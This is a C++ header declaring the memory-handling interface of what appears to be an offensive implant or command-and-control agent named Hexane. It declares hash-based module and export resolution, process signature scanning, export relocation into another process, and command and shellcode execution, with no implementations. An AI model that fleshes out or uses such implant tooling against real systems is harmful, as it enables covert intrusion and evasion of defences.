#ifndef HEXANE_CORELIB_MEMORY_HPP
#define HEXANE_CORELIB_MEMORY_HPP

#include <core/corelib.hpp>

namespace Memory {

    namespace Methods {
        FUNCTION UINT_PTR GetStackCookie();
        FUNCTION _resource* GetIntResource(HMODULE base, const int rsrc_id);
        FUNCTION _executable* CreateImageData(uint8_t *data);
    }

    namespace Context {
        FUNCTION VOID ContextInit();
        FUNCTION VOID ContextDestroy();
    }

    namespace Modules {
        FUNCTION HMODULE GetModuleAddress(const LDR_DATA_TABLE_ENTRY *data);
        FUNCTION LDR_DATA_TABLE_ENTRY* GetModuleEntry(const uint32_t hash);
        FUNCTION FARPROC GetExportAddress(const HMODULE base, const uint32_t hash);
        FUNCTION UINT_PTR LoadExport(const char* const module_name, const char* const export_name);
    }

    namespace Scanners {
        FUNCTION BOOL MapScan(_hash_map* map, uint32_t id, void** pointer);
        FUNCTION BOOL SymbolScan(const char* string, const char symbol, size_t length);
        FUNCTION UINT_PTR RelocateExport(void* const process, const void* const target, size_t size);
        FUNCTION BOOL SigCompare(const uint8_t* data, const char* signature, const char* mask);
        FUNCTION UINT_PTR SignatureScan(void* process, const uintptr_t start, const uint32_t size, const char* signature, const char* mask);
    }

    namespace Execute {
        FUNCTION BOOL ExecuteCommand(_parser &parser);
        FUNCTION BOOL ExecuteShellcode(const _parser &parser);
    }
}
#endif //HEXANE_CORELIB_MEMORY_HPP
